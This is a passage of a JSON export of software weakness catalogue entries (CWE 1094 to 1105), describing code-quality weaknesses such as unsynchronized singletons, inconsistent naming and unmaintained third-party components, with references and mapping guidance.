      "Description": "The product uses an unnecessarily complex internal representation for its data structures or interrelationships between those structures.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to understand or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        },
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "1094",
      "Name": "Excessive Index Range Scan for a Data Resource",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains an index range scan for a large data table,\n\t\t\t\t\tbut the scan can cover a large number of rows.",
      "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\n\nWhile the interpretation of \"large data table\" and \"excessive index range\" may vary for each product or developer, CISQ recommends a threshold of 1000000 table rows and a threshold of 10 for the index range.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "405",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-7"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-7",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1095",
      "Name": "Loop Condition Value Update within the Loop",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a loop with a control flow condition based on\n\t\t\t\t\ta value that is updated within the body of the loop.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1120",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-5"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-5",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1096",
      "Name": "Singleton Class Instance Creation without Proper Locking or Synchronization",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product implements a Singleton design pattern but does not use appropriate locking or other synchronization mechanism to ensure that the singleton class is only instantiated once.",
      "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably, e.g. by making the instantiation process non-thread-safe and introducing deadlock (CWE-833) or livelock conditions. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "820",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-12"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-12",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1097",
      "Name": "Persistent Storable Data Element without Associated Comparison Control Element",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a storable data element that does not have\n\t\t\t\t\tall of the associated functions or methods that are necessary to support\n\t\t\t\t\tcomparison.",
      "ExtendedDescription": "\n\nFor example, with Java, a class that is made persistent requires both hashCode() and equals() methods to be defined.\n\n\nThis issue can prevent the product from running reliably, due to incorrect or unexpected comparison results. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1076",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "595",
          "ViewID": "1305",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-4"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-4",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1098",
      "Name": "Data Element containing Pointer Item without Proper Copy Control Element",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The code contains a data element with a pointer that does not have an associated copy or constructor method.",
      "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1076",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-6"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-6",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1099",
      "Name": "Inconsistent Naming Conventions for Identifiers",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product's code, documentation, or other artifacts do not\n\t\t\t\t\tconsistently use the same naming conventions for variables, callables, groups of\n\t\t\t\t\trelated callables, I/O capabilities, data types, file names, or similar types of\n\t\t\t\t\telements.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and/or maintain the product due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1078",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-963",
          "Authors": [
            "Robert A. Martin",
            "Lawrence H. Shafer"
          ],
          "Title": "Providing a Framework for Effective Software Quality Assessment",
          "PublicationYear": "1996",
          "PublicationMonth": "07",
          "URL": "https://www.researchgate.net/publication/285403022_PROVIDING_A_FRAMEWORK_FOR_EFFECTIVE_SOFTWARE_QUALITY_MEASUREMENT_MAKING_A_SCIENCE_OF_RISK_ASSESSMENT",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1100",
      "Name": "Insufficient Isolation of System-Dependent Functions",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product or code does not isolate system-dependent\n\t\t\t\t\tfunctionality into separate standalone modules.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain and/or port the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1061",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-963",
          "Authors": [
            "Robert A. Martin",
            "Lawrence H. Shafer"
          ],
          "Title": "Providing a Framework for Effective Software Quality Assessment",
          "PublicationYear": "1996",
          "PublicationMonth": "07",
          "URL": "https://www.researchgate.net/publication/285403022_PROVIDING_A_FRAMEWORK_FOR_EFFECTIVE_SOFTWARE_QUALITY_MEASUREMENT_MAKING_A_SCIENCE_OF_RISK_ASSESSMENT",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1101",
      "Name": "Reliance on Runtime Component in Generated Code",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses automatically-generated code that cannot be\n\t\t\t\t\texecuted without a specific runtime support component.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-963",
          "Authors": [
            "Robert A. Martin",
            "Lawrence H. Shafer"
          ],
          "Title": "Providing a Framework for Effective Software Quality Assessment",
          "PublicationYear": "1996",
          "PublicationMonth": "07",
          "URL": "https://www.researchgate.net/publication/285403022_PROVIDING_A_FRAMEWORK_FOR_EFFECTIVE_SOFTWARE_QUALITY_MEASUREMENT_MAKING_A_SCIENCE_OF_RISK_ASSESSMENT",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1102",
      "Name": "Reliance on Machine-Dependent Data Representation",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The code uses a data representation that relies on low-level\n\t\t\t\t\tdata representation or constructs that may vary across different processors,\n\t\t\t\t\tphysical machines, OSes, or other physical components.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain and/or port the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "758",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "1105",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-963",
          "Authors": [
            "Robert A. Martin",
            "Lawrence H. Shafer"
          ],
          "Title": "Providing a Framework for Effective Software Quality Assessment",
          "PublicationYear": "1996",
          "PublicationMonth": "07",
          "URL": "https://www.researchgate.net/publication/285403022_PROVIDING_A_FRAMEWORK_FOR_EFFECTIVE_SOFTWARE_QUALITY_MEASUREMENT_MAKING_A_SCIENCE_OF_RISK_ASSESSMENT",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1103",
      "Name": "Use of Platform-Dependent Third Party Components",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product relies on third-party components that do\n\t\t\t\t\tnot provide equivalent functionality across all desirable\n\t\t\t\t\tplatforms.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "758",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-963",
          "Authors": [
            "Robert A. Martin",
            "Lawrence H. Shafer"
          ],
          "Title": "Providing a Framework for Effective Software Quality Assessment",
          "PublicationYear": "1996",
          "PublicationMonth": "07",
          "URL": "https://www.researchgate.net/publication/285403022_PROVIDING_A_FRAMEWORK_FOR_EFFECTIVE_SOFTWARE_QUALITY_MEASUREMENT_MAKING_A_SCIENCE_OF_RISK_ASSESSMENT",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1104",
      "Name": "Use of Unmaintained Third Party Components",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product relies on third-party components that are not\n\t\t\t\t\tactively supported or maintained by the original developer or a trusted proxy\n\t\t\t\t\tfor the original developer.",
      "ExtendedDescription": "\n\nReliance on components that are no longer maintained can make it difficult or impossible to fix significant bugs, vulnerabilities, or quality issues. In effect, unmaintained code can become obsolete.\n\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1357",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "ICS/OT",
          "Prevalence": "Undetermined"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1212",
          "Title": "A06:2021 - Vulnerable and Outdated Components",
          "PublicationYear": "2021",
          "PublicationMonth": "09",
          "PublicationDay": "24",
          "Publisher": "OWASP",
          "URL": "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1105",
      "Name": "Insufficient Encapsulation of Machine-Dependent Functionality",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product or code uses machine-dependent functionality, but\n\t\t\t\t\tit does not sufficiently encapsulate or isolate this functionality from\n\t\t\t\t\tthe rest of the code.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to port or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "758",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "1061",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-216",
          "Entries": [
            {
              "IntroText": "In this example function, the memory address of variable b is derived by adding 1 to the address of variable a. This derived address is then used to assign the value 0 to b."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid example() {\n\t\tchar a;\n\t\tchar b;\n\t\t*(&a + 1) = 0;\n\t}\n```"
            },
            {
              "BodyText": "Here, b may not be one byte past a. It may be one byte in front of a. Or, they may have three bytes between them because they are aligned on 32-bit boundaries."
            }
          ]
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-963",
          "Authors": [
            "Robert A. Martin",
            "Lawrence H. Shafer"
          ],
          "Title": "Providing a Framework for Effective Software Quality Assessment",
          "PublicationYear": "1996",
          "PublicationMonth": "07",
          "URL": "https://www.researchgate.net/publication/285403022_PROVIDING_A_FRAMEWORK_FOR_EFFECTIVE_SOFTWARE_QUALITY_MEASUREMENT_MAKING_A_SCIENCE_OF_RISK_ASSESSMENT",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    }
  ]
}